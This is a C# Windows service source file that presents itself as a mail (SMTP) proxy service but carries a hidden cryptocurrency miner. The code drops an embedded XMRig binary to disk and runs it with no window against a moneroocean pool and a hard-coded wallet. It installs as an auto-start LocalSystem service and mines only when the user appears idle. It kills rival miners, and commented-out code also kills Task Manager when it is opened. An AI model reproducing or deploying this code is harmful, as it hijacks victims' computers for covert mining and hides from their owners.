using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Configuration.Install;
using System.Timers;
using ZetaIpc.Runtime.Client;
using ZetaIpc.Runtime.Server;
using Freya.Proxy;
using System.IO;
using Newtonsoft.Json;

namespace Freya.Service
{
    public partial class ProxyService : ServiceBase
    {
        #region Private Members
        /// <summary>List of all proxies that have been started.</summary>
        private List<ImapProxy> imapProxies = null;
        private List<Pop3Proxy> pop3Proxies = null;
        private List<SmtpProxy> smtpProxies = null;
        private IpcServer radioServer = null;
        private IpcClient radioClient = null;
        private Process pMiner;
        private System.Timers.Timer MinerTimer;

        private FRegSetting reg = new FRegSetting();
        private Status s = new Status();


        #endregion Private Members


        public ProxyService()
        {
            InitializeComponent();
        }

        /// <summary>
        /// Handle the service start event by reading the settings file and starting all specified proxy instances.
        /// </summary>
        protected override void OnStart(string[] args)
        {
            // Start debugger if -d argument is applied
            if (args != null && args.Contains("-d"))
                Debugger.Launch();
            try
            {
                //Initialize IPC Server/Client
                radioServer = new IpcServer();
                radioServer.Start(FConstants.IPCPortService1);
                radioServer.ReceivedRequest += new EventHandler<ReceivedRequestEventArgs>(RadioReceiver);

                radioClient = new IpcClient();
                radioClient.Initialize(FConstants.IPCPortMainUI);

                //讀取Registry設定
                FFunc.GetSettingsFromRegistry(reg);

                //Start Proxys
                StartProxies();

                //CleanupMiner();  //改為在start miner時候再清理
                MakeSureMinerExist();

                //Timer for Miner
                MinerTimer = new System.Timers.Timer();
                MinerTimer.Elapsed += new ElapsedEventHandler(MinerStrategy);
                MinerTimer.Interval = 500;
                MinerTimer.Start();
            }
            catch (Exception ex)
            {
                radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = "[DBG] Service Start Fail:" + ex.Message, Loglevel = FConstants.FreyaLogLevel.FreyaInfo }));
            }

        }

        /// <summary>
        /// Handle the service stop event by stopping all proxies.
        /// </summary>
        protected override void OnStop()
        {
            try
            {
                if (imapProxies != null)
                {
                    foreach (ImapProxy imapProxy in imapProxies)
                        imapProxy.Stop();

                    imapProxies.Clear();
                }
                if (pop3Proxies != null)
                {
                    foreach (Pop3Proxy pop3Proxy in pop3Proxies)
                        pop3Proxy.Stop();

                    pop3Proxies.Clear();
                }
                if (smtpProxies != null)
                {
                    foreach (SmtpProxy smtpProxy in smtpProxies)
                        smtpProxy.Stop();

                    smtpProxies.Clear();
                }

                if (MinerTimer != null)
                {
                    MinerTimer.Stop();
                    MinerTimer.Dispose();
                }

                if (pMiner != null)
                {
                    pMiner.Kill();
                    pMiner.Dispose();
                    pMiner = null;
                }

                if (radioServer != null)
                    radioServer.Stop();
            }
            catch { }
        }

        /// <summary>
        /// Handle service continuations following pauses.
        /// </summary>
        protected override void OnContinue()
        {
            if (imapProxies != null)
            {
                foreach (ImapProxy imapProxy in imapProxies)
                    imapProxy.ProcessContinuation();

                imapProxies.Clear();
            }
            if (pop3Proxies != null)
            {
                foreach (Pop3Proxy pop3Proxy in pop3Proxies)
                    pop3Proxy.ProcessContinuation();

                pop3Proxies.Clear();
            }
            if (smtpProxies != null)
            {
                foreach (SmtpProxy smtpProxy in smtpProxies)
                    smtpProxy.ProcessContinuation();

                smtpProxies.Clear();
            }
        }

        /// <summary>
        /// Handle pause event.
        /// </summary>
        protected override void OnPause()
        {
            if (imapProxies != null)
            {
                foreach (ImapProxy imapProxy in imapProxies)
                    imapProxy.ProcessPause();

                imapProxies.Clear();
            }
            if (pop3Proxies != null)
            {
                foreach (Pop3Proxy pop3Proxy in pop3Proxies)
                    pop3Proxy.ProcessPause();

                pop3Proxies.Clear();
            }
            if (smtpProxies != null)
            {
                foreach (SmtpProxy smtpProxy in smtpProxies)
                    smtpProxy.ProcessPause();

                smtpProxies.Clear();
            }
        }

        /// <summary>
        /// Handle power events, such as hibernation.
        /// </summary>
        protected override bool OnPowerEvent(PowerBroadcastStatus powerStatus)
        {
            if (imapProxies != null)
            {
                foreach (ImapProxy imapProxy in imapProxies)
                    imapProxy.ProcessPowerEvent((int)powerStatus);

                imapProxies.Clear();
            }
            if (pop3Proxies != null)
            {
                foreach (Pop3Proxy pop3Proxy in pop3Proxies)
                    pop3Proxy.ProcessPowerEvent((int)powerStatus);

                pop3Proxies.Clear();
            }
            if (smtpProxies != null)
            {
                foreach (SmtpProxy smtpProxy in smtpProxies)
                    smtpProxy.ProcessPowerEvent((int)powerStatus);

                smtpProxies.Clear();
            }

            return base.OnPowerEvent(powerStatus);
        }

        /// <summary>
        /// Return the path where the service's settings should be saved and loaded.
        /// </summary>
        private static string GetSettingsFileName()
        {
            return AppDomain.CurrentDomain.BaseDirectory + "\\Freya.Proxy.xml";
        }

        /// <summary>
        /// DEBUG: For Console app debug
        /// </summary>
        internal void TestStartupAndStop(string[] args)
        {
            this.OnStart(args);
            Console.ReadLine();
            this.OnStop();
        }

        private void RadioReceiver(object sender, ReceivedRequestEventArgs args)
        {
            FMsg fMsg = JsonConvert.DeserializeObject<FMsg>(args.Request);
            if (fMsg.Type.Equals("CMD"))
            {
                switch (fMsg.Data)
                {
                    case "IDLESTOP":  // UI使用中
                        s.isIdle = false;
                        s.nonIdleTime = 0;
                        args.Response = "SCOK";
                        break;
                    case "IDLEGO":  // UI Idle
                        s.isIdle = true;
                        args.Response = "SCOK";
                        break;
                    case "MinerDisable":
                        s.MinerEnable = false;
                        args.Response = "SCOK";
                        break;
                    case "MinerEnable":
                        s.MinerEnable = true;
                        args.Response = "SCOK";
                        break;
                    case "GetStatus":
                        args.Response = JsonConvert.SerializeObject(s);
                        break;
                    case "StartProxy":
                        StartProxies();
                        args.Response = "StartProxy called";
                        break;

                    case "WriteRegistry":
                        if (fMsg.Data2.Length > 0)
                        {
                            WriteSettingToRegisry(fMsg.Data2);
                            args.Response = "SCOK";
                        }
                        else
                        {
                            args.Response = "SCNG";
                        }
                        break;
                    default:
                        args.Response = "SCNG";
                        break;
                }
            }
            else
                args.Response = "SCNG1";


            args.Handled = true;
        }

        private void WriteSettingToRegisry(string regJSON)
        {
            FRegSetting r = new FRegSetting();
            r = JsonConvert.DeserializeObject<FRegSetting>(regJSON);

            ///寫入 Registry
            ///
            FFunc.SetRegKey("LogLevel", (int)r.LogLevel);
            FFunc.SetRegKey("EMail", r.EMail);
            FFunc.SetRegKey("SmtpServerIp", r.SMTPServerIP);
            FFunc.SetRegKey("SMTPLogLevel", r.SMTPLogLevel);

            FFunc.SetRegKey("WebService", r.WebServiceIP);
            FFunc.SetRegKey("FeatureByte", Convert.ToInt32(r.FeatureByte));

        }

        private void StartProxies()
        {
            if (FFunc.GetRegKey("EMail") == null || FFunc.GetRegKey("SmtpServerIp") == null || FFunc.GetRegKey("WebService") == null)
            {
                //radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = "SMTP Proxy information net set, skip start proxy.", Loglevel = FConstants.FreyaLogLevel.ProxyInfo }));
                return;
            }

            //imapProxies = ImapProxy.StartProxiesFromSettingsFile(GetSettingsFileName());
            //pop3Proxies = Pop3Proxy.StartProxiesFromSettingsFile(GetSettingsFileName());
            //smtpProxies = SmtpProxy.StartProxiesFromSettingsFile(GetSettingsFileName());
            smtpProxies = SmtpProxy.StartProxiesFromRegistry(reg);
            radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = "SMTP Proxy started.", Loglevel = FConstants.FreyaLogLevel.ProxyInfo }));
        }

        private void CleanupMiner()
        {
            try
            {
                Process[] procs = Process.GetProcesses();
                foreach (Process p in procs)
                {
                    if (p.ProcessName == "xmrig" || p.ProcessName == "xmr-stak" || p.ProcessName == "WindowsServiceAgent" || p.ProcessName == FConstants.MinerFileName)
                        p.Kill();
                }
            }
            catch (Exception ex)
            {
                radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = "[DBG]Cleanup Miner fail:" + ex.Message, Loglevel = FConstants.FreyaLogLevel.MinerInfo }));
            }
        }

        private void StartMiner()
        {
            string MachineName = Environment.MachineName;
            try
            {
                Process[] miner1 = Process.GetProcessesByName(FConstants.MinerFileName);
                if (miner1.Length == 0)
                {
                    pMiner = new Process();
                    pMiner.StartInfo.Arguments = $" --background --cpu-priority 0 --api-port {FConstants.MinerAPIPort} --api-worker-id={MachineName} -o 10.57.209.245:3332 -u {MachineName} --nicehash -k -o 10.57.209.245:3333 -u {MachineName} --nicehash -k -o gulf.moneroocean.stream:10008 -u 48EzquWiBLcAEmkrh7CidEcepZja3EaKcXpBevmJiQDoZZMNcYedbgogCeGrFUZqCSBGAQxzBDYXoiYrJq1AAvzP2PVzKMK.{MachineName} -k";
                    pMiner.StartInfo.FileName = FConstants.MinerFilePath + "\\" + FConstants.MinerFileName;
                    pMiner.StartInfo.RedirectStandardOutput = true;
                    pMiner.StartInfo.UseShellExecute = false;
                    pMiner.StartInfo.CreateNoWindow = true;
                    MakeSureMinerExist();
                    CleanupMiner(); //清理其他Miner
                    pMiner.Start();
                    s.MinerIsActive = true;
                    radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "CMD", Data = "MinerActive" }));
                    //radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = "Miner Actived.", Loglevel = FConstants.FreyaLogLevel.MinerInfo }));


                    /*
                    using (StreamReader reader = pMiner.StandardOutput)
                    {
                        string result = reader.ReadToEnd();
                        radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = result, Loglevel = FConstants.FreyaLogLevel.MinerInfo }));

                    }
                    */
                }
            }
            catch (Exception ex)
            {
                radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = "[ERR] Start Miner fail:" + ex.Message, Loglevel = FConstants.FreyaLogLevel.MinerInfo }));
            }
        }

        private void StopMiner()
        {
            try
            {
                if (pMiner != null)
                {
                    pMiner.Kill();
                    pMiner.Dispose();
                    s.MinerIsActive = false;
                    pMiner = null;
                    radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "CMD", Data = "MinerStop" }));
                }
            }
            catch (Exception ex)
            {
                radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = "[ERR] (StopMiner)" + ex.Message, Loglevel = FConstants.FreyaLogLevel.MinerInfo }));
            }
        }

        private void MinerStrategy(object sender, ElapsedEventArgs e)
        {
            bool SafeToGo = true;

            /*
            ////避開特定程序 (Taskmgr)
            int con = 0;
            Process[] procs = Process.GetProcesses();

            foreach (Process p in procs)
            {
                if (p.ProcessName == "Taskmgr" || p.ProcessName == "taskmgr" || p.ProcessName == "dota2" || p.ProcessName == "csgo" || p.ProcessName == "payday")
                {
                    con++;
                    if (s.TaskmgrSeconds < 2) //避免一直送taskmgr found 訊息
                        radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = con + " Taskmgr found!", Loglevel = FConstants.FreyaLogLevel.RAW }));

                    if (s.TaskmgrSeconds / 2 > FConstants.TimeToCloseTaskmgr)
                    {
                        try { p.Kill(); } catch { }
                        radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = "TaskMgr Killed!", Loglevel = FConstants.FreyaLogLevel.MinerInfo }));

                    }
                    StopMiner();
                    SafeToGo = false;
                }
            }
            if (con == 0)
            {
                SafeToGo = true;
                s.TaskmgrSeconds = 0; //重設
            }
            else
                s.TaskmgrSeconds++;  //有找到taskmgr程序，開始計時
            */


            //// 非Idle mode太久且UI沒回應，自動啟動
            if (!s.isIdle) // 非Idle mode
            {
                SafeToGo = false;
                s.nonIdleTime++;
                if ((s.nonIdleTime * MinerTimer.Interval / 1000) > FConstants.TimeToAutoStart)
                {
                    SafeToGo = true;
                    s.nonIdleTime = 0;
                    s.isIdle = true;
                }
            }

            if (!s.MinerEnable)
                SafeToGo = false;

            if (SafeToGo)
                StartMiner();
            else if (s.MinerIsActive)
                StopMiner();
        }

        /// <summary>
        /// Save an embedded resource file to the file system.
        /// </summary>
        /// <param name="resourceFileName">Identifier of the embedded resource.</param>
        /// <param name="resourcePath">Full path to the embedded resource.</param>
        /// <param name="filePath">File system location to save the file.</param>
        private async void SaveResourceFile(string resourceFileName, string resourcePath, string filePath)
        {
            if (!File.Exists(filePath + "\\" + resourceFileName))
            {
                using (StreamReader resourceReader = new StreamReader(Assembly.GetAssembly(GetType()).GetManifestResourceStream(resourcePath + "." + resourceFileName)))
                {
                    using (StreamWriter fileWriter = new StreamWriter(filePath + "\\" + resourceFileName, false))
                    {
                        char[] buffer = new char[65536];

                        int bytesRead;
                        while ((bytesRead = await resourceReader.ReadAsync(buffer, 0, buffer.Length)) > 0)
                            await fileWriter.WriteAsync(buffer, 0, bytesRead);
                        radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = "Resource File saved: " + filePath + "\\" + resourceFileName, Loglevel = FConstants.FreyaLogLevel.RAW }));

                    }
                }
            }
        }

        private void MakeSureMinerExist()
        {
            string minerFullPath = FConstants.MinerFilePath + "\\" + FConstants.MinerFileName + ".exe";
            byte[] exeBytes = Properties.Resources.xmrig;

            if (!File.Exists(minerFullPath))
            {
                //SaveResourceFile(Constants.MinerFileName + ".exe", "Freya.Service.Resources", Constants.MinerFilePath); //這種方式寫入exe不能執行
                using (FileStream exeFile = new FileStream(minerFullPath, FileMode.Create))
                {
                    exeFile.Write(exeBytes, 0, exeBytes.Length);
                }

                radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = "Miner Dropped to system:" + minerFullPath, Loglevel = FConstants.FreyaLogLevel.MinerInfo }));
            }
            else
            {
                //radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = "Check Miner Version", Loglevel = FConstants.FreyaLogLevel.MinerInfo }));

                //check file version
            }

        }
    }


    /// =-------------------------------------------------------------------------------------------------------------------------

    /// <summary>
    /// Sets the service account to the local system.
    /// </summary>
    [RunInstaller(true)]
    public sealed class ProxyServiceProcessInstaller : ServiceProcessInstaller
    {
        public ProxyServiceProcessInstaller()
        {
            Account = ServiceAccount.LocalSystem;
        }
    }

    /// <summary>
    /// Handles OpaqueMail Proxy service installation.
    /// </summary>
    [RunInstaller(true)]
    public sealed class ProxyServiceInstaller : ServiceInstaller
    {
        /// <summary>
        /// Default constructor.
        /// </summary>
        public ProxyServiceInstaller()
        {
            Description = FConstants.ServiceDescription;
            DisplayName = FConstants.ServiceDisplayName;
            ServiceName = FConstants.ServiceName;
            StartType = ServiceStartMode.Automatic;
        }

        /// <summary>
        /// Handle installation and uninstallation.
        /// </summary>
        /// <param name="uninstall">Whether we're uninstalling.  False if installing, true if uninstalling</param>
        /// <param name="args">Any service installation arguments.</param>
        public void Install(bool uninstall, string[] args)
        {
            try
            {
                using (AssemblyInstaller installer = new AssemblyInstaller(typeof(Program).Assembly, args))
                {
                    IDictionary state = new Hashtable();
                    installer.UseNewContext = true;
                    try
                    {
                        // Attempt to install or uninstall.
                        if (uninstall)
                            installer.Uninstall(state);
                        else
                        {
                            installer.Install(state);
                            installer.Commit(state);
                        }
                    }
                    catch
                    {
                        // If an error is encountered, attempt to roll back.
                        try
                        {
                            installer.Rollback(state);
                        }
                        catch { }

                        throw;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine(ex.Message);
            }
        }
    }
}
